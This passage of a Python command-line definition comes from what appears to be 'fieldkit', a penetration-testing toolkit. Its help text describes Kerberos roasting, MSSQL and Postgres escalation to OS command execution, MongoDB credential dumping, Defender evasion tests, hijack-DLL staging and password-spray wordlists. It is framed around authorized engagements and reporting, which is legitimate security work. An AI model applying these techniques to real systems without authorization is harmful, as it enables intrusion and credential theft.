                    "dirs writable, creds present when hosts are — and TTP "
                    "catalog load) and reports a single pass/warn/fail exit "
                    "code CI can gate on. Works without an engagement — a "
                    "fresh box gets useful tools+lint output before any DB "
                    "exists.")
    p_doctor.add_argument("--json", action="store_true",
                           help="emit machine-readable JSON; exit code unchanged")
    p_doctor.add_argument("--fix", action="store_true",
                           help="auto-remediate warnings where the action is "
                                "unambiguous + safe (mkdir Linux stage dirs, "
                                "restore missing config defaults). Others "
                                "get a concrete hint but aren't touched. "
                                "After fixing, re-runs the probes so the "
                                "exit code reflects the post-fix state.")
    p_doctor.set_defaults(func=cmd_doctor)

    _build_session_parser(sub)
    _build_ttps_parser(sub)

    p_changelog = sub.add_parser(
        "changelog",
        help="auto-generate a CHANGELOG.md from git commit history",
        description="Parses `git log` for conventional-commit-shaped "
                    "subjects (feat/fix/refactor/chore/docs/test), "
                    "groups by prefix, and emits a markdown changelog. "
                    "Read-only — never edits git state.")
    p_changelog.add_argument("--out", metavar="PATH",
                              help="write to file (default: stdout)")
    p_changelog.add_argument("--since", metavar="REF",
                              help="git ref to limit history from "
                                   "(tag / commit / HEAD~N; default: "
                                   "whole history)")
    p_changelog.set_defaults(func=cmd_changelog)

    p_eng = sub.add_parser(
        "engagements",
        help="cross-engagement view (list / switch active)",
        description="fieldkit's core CLI works on one DB at a time; "
                    "this surface lets an operator see every engagement "
                    "across a directory tree, and switch which DB is "
                    "active via the FIELDKIT_DB env var.")
    eng_sub = p_eng.add_subparsers(dest="engagements_command",
                                       metavar="<action>")
    e_list = eng_sub.add_parser(
        "list", help="per-DB summary: name, counts, path")
    e_list.add_argument("--dir", metavar="PATH",
                         help="directory to walk (default: CWD)")
    e_list.add_argument("--recursive", action="store_true",
                         help="walk subdirectories too")
    e_list.add_argument("--json", action="store_true",
                         help="emit machine-readable JSON")
    e_list.set_defaults(func=cmd_engagements_list)

    e_switch = eng_sub.add_parser(
        "switch",
        help="print the export line to make <path> the active DB",
        description="Prints `export FIELDKIT_DB=<path>` — meant for "
                    "`eval $(fieldkit engagements switch eng.db)`. "
                    "Validates the DB first so a bad path never lands "
                    "as the active engagement.")
    e_switch.add_argument("path", help="path to the engagement DB")
    e_switch.set_defaults(func=cmd_engagements_switch)

    p_eng.set_defaults(func=lambda a: _missing(p_eng))

    p_diff = sub.add_parser(
        "diff",
        help="compare findings between the current engagement and a baseline DB",
        description="Identity for a finding is (vector_type, title, "
                    "host_id) — same key report.build() renders by. "
                    "Emits new / gone / unchanged sections. Read-only "
                    "over both DBs; exit 0 always (empty diff is a "
                    "valid result). --json for CI.")
    p_diff.add_argument("baseline",
                         help="baseline DB path (usually a prior engagement's "
                              "engagement.db)")
    p_diff.add_argument("--include-observations", action="store_true",
                         help="include unproven observations in the diff "
                              "(default: proven findings only)")
    p_diff.add_argument("--verbose", action="store_true",
                         help="also list unchanged findings (default: "
                              "only new + gone shown)")
    p_diff.add_argument("--json", action="store_true",
                         help="emit machine-readable JSON")
    p_diff.set_defaults(func=cmd_diff)

    p_refresh = sub.add_parser(
        "refresh",
        help="one-liner: re-ingest recce bridge + run analyze",
        description="Returning-operator convenience: re-ingests a "
                    "recce-bridge.json, prints the counts delta of "
                    "what changed in state, then runs analyze verbatim "
                    "so the latest ranked moves + escalate hints "
                    "surface without three separate commands. "
                    "Bridge path optional: without one, uses the "
                    "engagement config's `recce_bridge` key.")
    p_refresh.add_argument("bridge", nargs="?",
                            help="path to recce-bridge.json (optional; "
                                 "defaults to config recce_bridge)")
    p_refresh.add_argument("--proof", action="store_true",
                            help="include safe-proof lines in the ranked "
                                 "output (passes through to analyze)")
    p_refresh.set_defaults(func=cmd_refresh)

    p_prep = sub.add_parser(
        "prep", help="build a manual route's artifact + print where to place it and the steps",
        description="Proactive provision for routes the loop can't one-shot (overwrite a "
                    "running service binary, plant a hijack DLL): fieldkit builds the "
                    "artifact and prints the placement path + ordered operator steps. "
                    "--stage also uploads it to the target's stage dir.")
    p_prep.add_argument("host", metavar="IP", help="the host the vector is on")
    p_prep.add_argument("vector", help="the manual vector key (e.g. writablesvc:AppMgmt)")
    p_prep.add_argument("--stage", action="store_true",
                        help="also upload the built artifact to the target (config-change)")
    p_prep.add_argument("-y", "--yes", action="store_true", help="skip the confirm when staging")
    p_prep.set_defaults(func=cmd_prep)

    p_lab = sub.add_parser(
        "lab", help="prove evasion techniques against a Defender lab host")
    lab_sub = p_lab.add_subparsers(dest="lab_command", metavar="<action>")
    l_test = lab_sub.add_parser(
        "test", help="run the benign probes and record Defender's verdict",
        description="Confirms the lab's Defender is live (EICAR control), then runs a "
                    "benign probe per technique and records green/red from Defender's "
                    "own verdict. Refuses to report greens from an unprotected lab.")
    l_test.add_argument("--host", metavar="IP", help="lab host (default: config lab_host)")
    l_test.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    l_test.set_defaults(func=cmd_lab_test)
    p_lab.set_defaults(func=lambda a: _missing(p_lab))

    p_recce = sub.add_parser(
        "recce", help="drive recce webui — currently the session-task diagnostic",
        description="Endpoints for the recce-session execution transport. Requires "
                    "`recce_url` in engagement config.")
    recce_sub = p_recce.add_subparsers(dest="recce_command", metavar="<cmd>")
    r_ping = recce_sub.add_parser(
        "ping", help="POST a one-shot command through a recce-caught session",
        description="Diagnostic: proves the recce-session transport is wired. Runs "
                    "one command on the target through recce and prints the captured "
                    "output. Use before `escalate --via-recce=<id>`.")
    r_ping.add_argument("session_id", help="recce session id (12-hex from recce webui)")
    r_ping.add_argument("--cmd", default=None,
                        help="command to run on the target (default: whoami)")
    r_ping.add_argument("--timeout", type=float, default=30.0,
                        help="task timeout in seconds (default: 30)")
    r_ping.set_defaults(func=cmd_recce_ping)
    p_recce.set_defaults(func=lambda a: _missing(p_recce))

    p_posture = sub.add_parser(
        "posture", help="the evasion green/red matrix + recommended delivery",
        description="Shows every technique's status under assume-caught (red until a "
                    "fresh lab result proves it clean) and the recommended delivery order.")
    p_posture.set_defaults(func=cmd_posture)

    p_roast = sub.add_parser(
        "roast", help="Kerberoast / AS-REP roast a DC into crackable loot",
        description="Drives nxc's Kerberos roasting against a DC with a domain "
                    "credential, stores the $krb5tgs$/$krb5asrep$ hashes as loot, and "
                    "feeds the loop — crack offline, then `add cred` the result.")
    p_roast.add_argument("--dc", metavar="IP", help="DC to roast (default: a host marked --dc)")
    p_roast.add_argument("--kind", choices=["both", "kerberoast", "asrep"], default="both",
                         help="which roast (default: both)")
    p_roast.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    p_roast.set_defaults(func=cmd_roast)

    # ------------------------------------------------------- coerce chains
    _build_chain_parser(sub)
    _build_bloodhound_parser(sub)

    p_deleg = sub.add_parser(
        "delegation", help="find Kerberos delegation (unconstrained/constrained/RBCD)",
        description="Drives nxc --find-delegation with a domain credential and records "
                    "each delegated account as a finding for analyze/report.")
    p_deleg.add_argument("--dc", metavar="IP", help="DC to query (default: a host marked --dc)")
    p_deleg.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    p_deleg.set_defaults(func=cmd_delegation)

    p_adcs = sub.add_parser("adcs", help="AD Certificate Services (certipy) enumeration")
    adcs_sub = p_adcs.add_subparsers(dest="adcs_command", metavar="<action>")
    a_find = adcs_sub.add_parser(
        "find", help="enumerate vulnerable certificate templates (ESC1-16)",
        description="Drives `certipy find -vulnerable` with a domain credential and "
                    "records each ESC weakness as a finding for analyze/report.")
    a_find.add_argument("--dc", metavar="IP", help="DC/CA host (default: a host marked --dc)")
    a_find.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    a_find.set_defaults(func=cmd_adcs_find)
    p_adcs.set_defaults(func=lambda a: _missing(p_adcs))

    p_mssql = sub.add_parser(
        "mssql", help="MSSQL privilege escalation (low-priv login → sysadmin → SYSTEM)")
    mssql_sub = p_mssql.add_subparsers(dest="mssql_command", metavar="<action>")
    m_esc = mssql_sub.add_parser(
        "escalate", help="try EXECUTE AS impersonation / linked-server paths to sysadmin",
        description="From a non-sysadmin MSSQL login, enumerates the SQL-layer escalation "
                    "surface (impersonatable sysadmin logins, RPC-out linked servers). With "
                    "--allow config-change it impersonates a sysadmin login and adds your "
                    "login to the sysadmin role (reversible), so `enum`/`escalate` then run "
                    "over xp_cmdshell → SYSTEM. Read-only without --allow.")
    m_esc.add_argument("host", metavar="IP", help="the MSSQL host")
    m_esc.add_argument("--allow", action="append", choices=["config-change"], metavar="LEVEL",
                       help="permit the role grant (config-change) to actually escalate")
    m_esc.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    m_esc.set_defaults(func=cmd_mssql_escalate)
    p_mssql.set_defaults(func=lambda a: _missing(p_mssql))

    p_pg = sub.add_parser(
        "postgres", help="PostgreSQL privilege escalation (login → superuser → OS exec)",
        aliases=["pg", "psql"])
    pg_sub = p_pg.add_subparsers(dest="pg_command", metavar="<action>")
    pg_esc = pg_sub.add_parser(
        "escalate", help="find COPY FROM PROGRAM / SET ROLE paths to OS exec",
        description="From a Postgres login, enumerates the DB-layer escalation surface: "
                    "am I superuser?, roles I'm a member of that grant superuser, and "
                    "whether pg_execute_server_program covers me. With --allow "
                    "config-change it runs `COPY FROM PROGRAM 'id'` (directly if "
                    "superuser or a member of pg_execute_server_program; else via "
                    "SET ROLE to a member superuser). Read-only without --allow.")
    pg_esc.add_argument("host", metavar="IP", help="the Postgres host")
    pg_esc.add_argument("--port", type=int, default=5432, help="port (default 5432)")
    pg_esc.add_argument("-d", "--database", default="postgres",
                        help="database to connect to (default: postgres)")
    pg_esc.add_argument("--allow", action="append", choices=["config-change"],
                        metavar="LEVEL",
                        help="permit COPY FROM PROGRAM to actually run")
    pg_esc.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    pg_esc.set_defaults(func=cmd_postgres_escalate)
    p_pg.set_defaults(func=lambda a: _missing(p_pg))

    p_mongo = sub.add_parser(
        "mongodb", help="MongoDB privilege enumeration + credential extraction",
        aliases=["mongo"])
    mongo_sub = p_mongo.add_subparsers(dest="mongo_command", metavar="<action>")
    mongo_esc = mongo_sub.add_parser(
        "escalate", help="enumerate roles + dump users; flag unauth exposure",
        description="MongoDB (4.0+) has no native OS-exec analog. This enumerates the "
                    "auth surface (identity, roles, databases), records unauth exposure "
                    "as a Critical proven finding, and — with --allow config-change — "
                    "dumps admin.system.users. With --scan-data it also counts "
                    "credential-shaped fields (password/hash/token) across application "
                    "collections; values are not captured — the operator dumps them "
                    "separately if the ROE allow.")
    mongo_esc.add_argument("host", metavar="IP", help="the MongoDB host")
    mongo_esc.add_argument("--port", type=int, default=27017,
                           help="port (default 27017)")
    mongo_esc.add_argument("-d", "--database", default="admin",
                           help="authenticationDatabase (default: admin)")
    mongo_esc.add_argument("--scan-data", action="store_true",
                           help="also count credential-field candidates across app DBs")
    mongo_esc.add_argument("--allow", action="append", choices=["config-change"],
                           metavar="LEVEL",
                           help="permit user dump + data scan (writes to the audit log)")
    mongo_esc.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    mongo_esc.set_defaults(func=cmd_mongodb_escalate)
    p_mongo.set_defaults(func=lambda a: _missing(p_mongo))

    p_report = sub.add_parser(
        "report", help="render the customer report (proven Findings + Observations)",
        description="Projects the engagement database into a report: exec summary + "
                    "proven Findings (with the captured PoC trail) and clearly-labelled "
                    "Observations (seen, not exploited), severity/CWE/remediation from the "
                    "KB. --proven-only drops the Observations; --check gates on "
                    "anti-fabrication; --cleanup writes the internal artifact manifest.")
    p_report.add_argument("-o", "--out", default="report", metavar="BASENAME",
                          help="output basename (default: report)")
    p_report.add_argument("--formats", default="md,docx,pdf,html",
                          help="which to emit: md,docx,pdf,html (default: all)")
    p_report.add_argument("--check", action="store_true",
                          help="anti-fabrication gate only (exit 2 on errors)")
    p_report.add_argument("--cleanup", action="store_true",
                          help="write the INTERNAL cleanup manifest instead of the report")
    p_report.add_argument("--proven-only", action="store_true",
                          help="only demonstrated compromises — omit the Observations")
    # retired: --all (observations are now in the report by default). Kept as a hidden,
    # no-op alias so existing scripts don't break — it was the old way to include them.
    p_report.add_argument("--all", action="store_true", help=argparse.SUPPRESS)
    p_report.add_argument("--force", action="store_true",
                          help="render even if the anti-fabrication check has errors")
    p_report.add_argument("--open", action="store_true",
                          help="after export, hand the richest produced file "
                               "(html > pdf > docx > md) to the OS default handler "
                               "(xdg-open on Linux, open on macOS, start on Windows). "
                               "Silent no-op when no opener is on PATH.")
    p_report.set_defaults(func=cmd_report)

    p_recce = sub.add_parser(
        "export-recce", help="fold proven findings back into recce (fieldkit-import JSON)",
        description="Emits the KB-enriched JSON recce imports with `recce "
                    "fieldkit-import`, so every proven finding lands back in recce's "
                    "workbook + report.")
    p_recce.add_argument("out", nargs="?", help="output file (default: recce_findings.json)")
    p_recce.add_argument("--all", action="store_true",
                         help="include unproven findings (default: proven only)")
    p_recce.set_defaults(func=cmd_export_recce)

    p_archive = sub.add_parser(
        "archive", help="package the whole engagement into one tarball (handoff / retention)",
        description="Assembles a single .tar.gz with everything: the SQLite DB, "
                    "the rendered report (md/docx/pdf), the internal cleanup "
                    "manifest, the recce export, and a JSONL of every captured "
                    "step. Includes a MANIFEST.md describing the contents, the "
                    "fieldkit version, and the schema version. The archive is "
                    "INTERNAL — it contains cleanup + raw DB (with hashes); the "
                    "customer-facing deliverable is report.docx separately.")
    p_archive.add_argument("--out", metavar="PATH",
                           help="tarball path (default: "
                                "<engagement-slug>-<YYYY-MM-DD>.tar.gz in CWD)")
    p_archive.add_argument("--formats", default="md,docx,pdf", metavar="LIST",
                           help="report formats to render into the archive "
                                "(default: md,docx,pdf; pandoc needed for docx/pdf)")
    p_archive.set_defaults(func=cmd_archive)

    p_wordlist = sub.add_parser(
        "wordlist", help="generate a targeted wordlist from seeds via inspectable mutation rules",
        description="""Build a password wordlist from seed words (company name, product,
common word) by applying an inspectable mutation ruleset — cases + leet + suffixes
by default, prefixes/combine/seasons opt-in. Pipes directly into `fieldkit spray
--wordlist`.

Examples:

  fieldkit wordlist Acme Widget --years 2024 2025 --out passwords.txt
  fieldkit wordlist Acme --seasons --combine --max 10000 --out passwords.txt
  fieldkit wordlist --from-text "$(cat about-page.html)" --years 2024 2025 --out p.txt
  fieldkit wordlist --from-file seeds.txt --out p.txt
  fieldkit wordlist --rules      # print the ruleset""",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p_wordlist.add_argument("seeds", nargs="*", metavar="SEED",
                            help="seed words to mutate (e.g. company name, product)")
    p_wordlist.add_argument("--rules", action="store_true",
                            help="print the mutation ruleset and exit")
    p_wordlist.add_argument("--out", metavar="FILE",
                            help="output file (default: print to stdout)")
    p_wordlist.add_argument("--from-file", metavar="PATH",
                            help="read seed words from a file (one per line, # comments OK)")
    p_wordlist.add_argument("--from-text", metavar="TEXT",
                            help="extract seed words from a text blob (paste in About-page copy)")
    p_wordlist.add_argument("--years", nargs="+", type=int, metavar="YEAR",
                            help="years to append as suffixes (e.g. --years 2024 2025)")
    p_wordlist.add_argument("--suffix", nargs="+", metavar="STR",
                            help="extra suffix(es) to append (adds to the built-in set)")
    p_wordlist.add_argument("--prefix", nargs="+", metavar="STR",
                            help="extra prefix(es) to prepend")
    p_wordlist.add_argument("--seasons", action="store_true",
                            help="add every season + month to the seed pool")
    p_wordlist.add_argument("--combine", action="store_true",
                            help="also concat seed pairs (Acme+Widget → AcmeWidget). "
                                 "Combinatorial — bounded by --max")
    p_wordlist.add_argument("--walks", action="store_true",
                            help="include keyboard walks (qwerty/qazwsx/1qaz2wsx families, "
                                 "shift-mix, common non-walks like Password1) as standalone "
                                 "passwords in the output")
    p_wordlist.add_argument("--wrapped", action="store_true",
                            help="wrap seeds with symbols+numbers before/after: "
                                 "!Password2024!, #Winter@, 2024Password!, etc. Best paired "
                                 "with --min-len 12 for modern policies")
    p_wordlist.add_argument("--long", action="store_true",
                            help="preset for modern ≥12-char engagements: enables --walks + "
                                 "--wrapped, sets --min-len 12 --max-len 16 (both still "
                                 "overridable). One shape among others; keep in mind real "
                                 "policies vary")
    p_wordlist.add_argument("--prefixes", action="store_true",
                            help="apply prefix rule (uses --prefix + --years); off by default "
                                 "because corporate patterns are almost all suffix-heavy")
    p_wordlist.add_argument("--no-cases", action="store_true",
                            help="disable capitalization variants (First, UPPER)")
    p_wordlist.add_argument("--no-leet", action="store_true",
                            help="disable leet substitutions (o→0, e→3, ...)")
    p_wordlist.add_argument("--no-suffixes", action="store_true",
                            help="disable the built-in suffix set (rarely useful)")
    p_wordlist.add_argument("--min-len", type=int, default=6, metavar="N",
                            help="minimum word length (default: 6)")
    p_wordlist.add_argument("--max-len", type=int, default=32, metavar="N",
                            help="maximum word length (default: 32)")
    p_wordlist.add_argument("--max", type=int,
                            default=wordlist_mod.DEFAULT_MAX_OUTPUT, metavar="N",
                            help=f"maximum total words (default: {wordlist_mod.DEFAULT_MAX_OUTPUT})")
    p_wordlist.set_defaults(func=cmd_wordlist)

    p_usernames = sub.add_parser(
        "usernames", help="generate a userlist from first/last name pairs "
                          "(schemas: first.last, flast, ...)",
        description="""Common username patterns from first + last names. Defaults
cover: first, last, first.last, firstlast, flast, first_last, lastf, last.first.

Examples:

  fieldkit usernames --first john jane --last doe smith
  fieldkit usernames --first-file firsts.txt --last-file lasts.txt --out users.txt
  fieldkit usernames --first john --last doe --patterns '{f}{last}'  # only jdoe

The default schema-set matches ~90%% of real-world corporate patterns. Override
with --patterns for banks (flast), schools (first.last), or a client-specific
convention.""",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p_usernames.add_argument("--first", nargs="+", metavar="NAME",
                             help="first name(s)")
    p_usernames.add_argument("--last", nargs="+", metavar="NAME",
                             help="last name(s)")
    p_usernames.add_argument("--first-file", metavar="PATH",
                             help="read first names from a file (one per line, # comments OK)")
    p_usernames.add_argument("--last-file", metavar="PATH",
                             help="read last names from a file (one per line, # comments OK)")
    p_usernames.add_argument("--patterns", nargs="+", metavar="TMPL",
                             help="username templates (variables: {first} {last} {f} {l}); "
                                  "overrides the default schema set")
    p_usernames.add_argument("--out", metavar="FILE",
                             help="output file (default: print to stdout)")
    p_usernames.set_defaults(func=cmd_usernames)

    p_arsenal = sub.add_parser(
        "arsenal", help="what tools/exploits are staged, and what each route needs")
    ar_sub = p_arsenal.add_subparsers(dest="arsenal_command", metavar="<action>")
    ar_list = ar_sub.add_parser("list", help="list staged artifacts by category")
    ar_list.set_defaults(func=cmd_arsenal_list)
    ar_check = ar_sub.add_parser(
        "check", help="readiness: which privesc/evasion routes are ready vs need staging")
    ar_check.add_argument("--all", action="store_true", help="show every route, not just gaps")
    ar_check.set_defaults(func=cmd_arsenal_check)
    ar_find = ar_sub.add_parser("find", help="print the path to a staged artifact by name")
    ar_find.add_argument("name")
    ar_find.set_defaults(func=cmd_arsenal_find)
    ar_rules = ar_sub.add_parser(
        "rules", help="print the failure-classifier ruleset (how it reads tool output)")
    ar_rules.set_defaults(func=lambda a: (print(classify_mod.describe_rules()) or 0))
    p_arsenal.set_defaults(func=cmd_arsenal_list)  # bare `arsenal` = list

    p_status = sub.add_parser("status", help="the engagement board")
    p_status.add_argument("--hosts", action="store_true", help="list every host")
    p_status.add_argument("--creds", action="store_true", help="list every credential")
    p_status.add_argument("--json", action="store_true",
                          help="emit the status as JSON (machine-readable projection); "
                               "the shape is versioned via `_projection`")
    p_status.set_defaults(func=cmd_status)

    p_tui = sub.add_parser(
        "tui", help="open the terminal workbench (Textual TUI)",
        description="Launches the interactive TUI — dashboard, analyze, "
                    "escalate launcher, live event tail — driven from your "
                    "existing engagement DB. Uses vendored Textual (see "
                    "fieldkit/vendor/), so no pip install is required.")
    p_tui.set_defaults(func=cmd_tui)

    p_watch = sub.add_parser(
        "watch", help="stream engagement events (JSONL) as they land",
        description="Polls the engagement DB and emits one JSON line per new "
                    "step / finding / credential / access / loot row — the seam "
                    "the TUI (and any external monitor) consumes. Runs until Ctrl-C.")
    p_watch.add_argument("--json", action="store_true",
                         help="required — reserved for future non-JSON formats")
    p_watch.add_argument("--kinds", default=",".join(watch_mod.EVENT_KINDS),
                         help="comma-separated event kinds to include "
                              f"(default: {','.join(watch_mod.EVENT_KINDS)})")
    p_watch.add_argument("--interval", type=float, default=watch_mod.INTERVAL,
                         help=f"seconds between polls (default: {watch_mod.INTERVAL})")
    p_watch.add_argument("--from-now", action="store_true",
                         help="skip existing rows; only emit events that land after "
                              "this watch started")
    p_watch.set_defaults(func=cmd_watch)

    return parser


def _missing(parser):
    parser.print_help(sys.stderr)
    return 2


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    if not getattr(args, "func", None):
        parser.print_help(sys.stderr)
        return 2
    # Session recording — captures exit code + duration on any
    # exit path (happy, error, interrupt). No-op unless
    # FIELDKIT_SESSION_LOG is set; skips session-management
    # subcommands to prevent replay loops.
    from . import session as _session
    import time as _time
    recording = _session.is_recording_enabled()
    invoked_argv = list(argv) if argv is not None else sys.argv[1:]
    start = _time.monotonic() if recording else None
    rc = 2
    try:
        try:
            rc = args.func(args)
        except FieldkitError as exc:
            # Every operator-actionable failure lands here; anything else is a fieldkit bug.
            _err(str(exc))
            rc = 2
        except FileNotFoundError as exc:
            _err(f"{exc.filename}: no such file")
            rc = 2
        except sqlite3.Error as exc:
            # A locked/read-only/corrupt database is an operator problem, not a crash.
            _err(f"database error: {exc}")
            rc = 2
        except BrokenPipeError:  # pragma: no cover - `| head`
            rc = 0
        except KeyboardInterrupt:  # pragma: no cover - operator hit ^C
            _err("interrupted")
            rc = 130
        return rc
    finally:
        if recording:
            duration_ms = int((_time.monotonic() - start) * 1000)
            _session.record(invoked_argv, rc, duration_ms)
